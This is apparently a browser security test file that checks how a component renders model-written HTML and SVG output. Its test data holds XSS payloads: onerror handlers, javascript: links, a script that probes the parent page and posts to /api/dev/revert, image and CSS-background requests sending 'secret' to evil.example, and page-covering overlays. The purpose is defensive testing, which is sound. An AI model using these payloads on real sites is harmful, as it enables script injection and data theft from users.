// What model- or corpus-written output can do in a real browser (components/Outputs.tsx), the half of
// tests/public/security.test.tsx that jsdom cannot show: the browser's own sandbox, layout and what it fetches. A
// scripted html output runs in a frame that cannot reach the page, and what it posts to the API leaves as `Origin:
// null`, which the backend's Origin check refuses; inlined html or svg runs no script, loads nothing from another host
// and cannot draw over the page. Every request the page and its frames make is recorded, and any to another host fails
// the check.
import assert from 'node:assert/strict'
import { afterAll, beforeAll, test } from 'vitest'
import type { Browser, Page } from 'playwright'
import { readFileSync } from 'node:fs'
import { bundle, cleanup, FRONTEND, launch, ORIGIN, src } from './page.ts'

let browser: Browser
let page: Page
/** every request the page or its frames made to the app's /api, with its method and Origin */
const api: { method: string; path: string; origin: string | null }[] = []
/** every request to another host */
const outbound: string[] = []

beforeAll(async () => {
  const script = await bundle('output-security', [
    `import { createRoot } from 'react-dom/client'`,
    `import { flushSync } from 'react-dom'`,
    `import { Output } from '${src('components/Outputs.tsx')}'`,
    `const mount = (node) => { const el = document.createElement('div'); el.style.width = '640px'; el.id = 'm' + Math.random().toString(36).slice(2); document.body.appendChild(el); flushSync(() => createRoot(el).render(node)); return el.id }`,
    `window.__t = { output: (bundle) => mount(<Output bundle={bundle} />) }`,
  ])
  browser = await launch()
  page = await browser.newPage()
  await page.route('**/*', (route) => {
    const req = route.request()
    const url = new URL(req.url())
    if (url.protocol === 'data:' || url.protocol === 'blob:') return route.continue()
    if (url.origin !== ORIGIN) {
      outbound.push(req.url())
      return route.fulfill({ status: 200, contentType: 'image/png', body: '' })
    }
    if (url.pathname.startsWith('/api/')) {
      api.push({ method: req.method(), path: url.pathname, origin: req.headers()['origin'] ?? null })
      return route.fulfill({ status: 404, contentType: 'application/json', body: '{"detail":"not found"}' })
    }
    return route.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html><html><head><meta charset="utf-8"></head><body></body></html>' })
  })
  await page.goto(`${ORIGIN}/?ws=mini`)
  await page.addScriptTag({ path: script })
})

afterAll(async () => {
  await browser?.close()
  cleanup()
})

const settle = (ms = 400) => new Promise((r) => setTimeout(r, ms))
const pwned = () => page.evaluate(() => (window as any).__pwned ?? null)
const output = (bundle: Record<string, unknown>): Promise<string> => page.evaluate((b) => (window as any).__t.output(b), bundle)
const leaks = () => outbound.filter((u) => u.includes('evil.example'))

test('a scripted html output runs in a frame that cannot reach the page or post to the API as the page', async () => {
  const probe = `<p>probe</p><script>(async () => {
    const out = {}
    try { out.parentDoc = String(parent.document.title) } catch (e) { out.parentDoc = 'blocked' }
    try { await parent.fetch('/api/dev/revert', { method: 'POST' }); out.parentFetch = 'called' } catch (e) { out.parentFetch = 'blocked' }
    try { parent.__pwned = 'frame'; out.parentWrite = parent.__pwned === 'frame' ? 'wrote' : 'blocked' } catch (e) { out.parentWrite = 'blocked' }
    try { await fetch('/api/dev/revert', { method: 'POST' }) } catch (e) {}
    parent.postMessage({ probe: out }, '*')
  })()</script>`
  const got = page.evaluate(() => new Promise((resolve) => addEventListener('message', (e) => e.data?.probe && resolve(e.data.probe))))
  const id = await output({ 'text/html': probe })
  assert.deepEqual(await got, { parentDoc: 'blocked', parentFetch: 'blocked', parentWrite: 'blocked' })
  assert.equal(await pwned(), null)
  assert.equal(await page.evaluate((id) => document.querySelector(`#${id} iframe`)?.getAttribute('sandbox'), id), 'allow-scripts')
  // the frame's POST left as `Origin: null`; nothing went out as the page
  const posts = api.filter((r) => r.method === 'POST' && r.path === '/api/dev/revert')
  assert.ok(posts.length >= 1)
  assert.ok(posts.every((r) => r.origin === 'null'), JSON.stringify(posts))
})

test('an inlined html output runs no script, keeps no style or form, and loads nothing from another host', async () => {
  const html = [
    '<table><thead><tr><th></th><th>n</th></tr></thead><tbody><tr><th>a</th><td>1</td></tr></tbody></table>',
    '<img src="x" onerror="window.__pwned = \'img\'">',
    '<style>body { display: none }</style>',
    '<form action="/api/dev/revert" method="post"><button id="go">Go</button></form>',
    '<img id="leak" src="https://evil.example/leak.png?d=secret">',
    '<div id="bg" style="background: url(https://evil.example/bg.png)">bg</div>',
    '<a id="js" href="javascript:window.__pwned = \'link\'">j</a>',
    '<a id="ext" href="https://example.org/">ext</a>',
    '<svg><foreignObject><img src="x" onerror="window.__pwned = \'fo\'"></foreignObject></svg>',
    '<img id="local" src="data:image/png;base64,iVBORw0KGgo=">',
  ].join('')
  const id = await output({ 'text/html': html })
  await settle()
  const seen = await page.evaluate((id) => {
    const el = document.getElementById(id)!
    // an output's ids are prefixed, so none is the app's
    const q = (name: string) => el.querySelector<HTMLElement>(`#user-content-${name}`)
    q('js')?.click()
    return {
      table: !!el.querySelector('table td'),
      styles: document.querySelectorAll('style').length,
      form: !!el.querySelector('form, button'),
      leak: !!q('leak')?.getAttribute('src'),
      bgStyle: q('bg')?.getAttribute('style') ?? null,
      jsHref: q('js')?.getAttribute('href') ?? null,
      ext: [q('ext')?.getAttribute('target'), q('ext')?.getAttribute('rel')],
      local: !!q('local')?.getAttribute('src'),
      iframe: !!el.querySelector('iframe'),
    }
  }, id)
  await settle(200)
  assert.equal(await pwned(), null)
  assert.deepEqual(seen, { table: true, styles: 0, form: false, leak: false, bgStyle: null, jsHref: null, ext: ['_blank', 'noreferrer noopener'], local: true, iframe: false })
  assert.deepEqual(leaks(), [])
})

test('an inlined html output cannot draw over the page', async () => {
  const id = await output({ 'text/html': '<div class="chat-perm" style="position: fixed; inset: 0; z-index: 2147483647; background: red; transform: translate(0, 0)">cover</div>' })
  await settle()
  const got = await page.evaluate((id) => {
    const el = document.getElementById(id)!
    const top = document.elementFromPoint(innerWidth - 2, innerHeight - 2)
    const div = el.querySelector('.outputs-html > div')
    return { covered: !!top && el.contains(top), cls: div ? div.getAttribute('class') : 'missing', style: div?.getAttribute('style') ?? null }
  }, id)
  assert.deepEqual(got, { covered: false, cls: null, style: 'background-color: red;' })
})

test('an svg figure cannot draw over the page', async () => {
  const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="100pt" height="50pt" viewBox="0 0 100 50" overflow="visible" style="position: fixed; inset: 0; z-index: 2147483647; transform: translate(0, 0); stroke-linecap: butt">
 <rect x="-5000" y="-5000" width="10000" height="10000" fill="red"/>
</svg>`
  const id = await output({ 'image/svg+xml': svg })
  // the outputs' stylesheet, for the figure's box; removed after, since other checks count the page's style elements
  const sheet = await page.addStyleTag({ content: readFileSync(`${FRONTEND}/src/styles/outputs.css`, 'utf8') })
  await settle()
  const got = await page.evaluate((id) => {
    const fig = document.getElementById(id)!.querySelector('svg')!
    const box = fig.parentElement!.getBoundingClientRect()
    const mine = (x: number, y: number) => {
      const top = document.elementFromPoint(x, y)
      return !!top && fig.contains(top)
    }
    return {
      corner: mine(innerWidth - 2, innerHeight - 2),
      beside: mine(box.right + 20, box.top + 10),
      inside: mine(box.left + 10, box.top + 10),
      style: fig.getAttribute('style'),
    }
  }, id)
  await sheet.evaluate((node) => node.parentNode?.removeChild(node))
  assert.deepEqual(got, { corner: false, beside: false, inside: true, style: 'stroke-linecap: butt' })
})
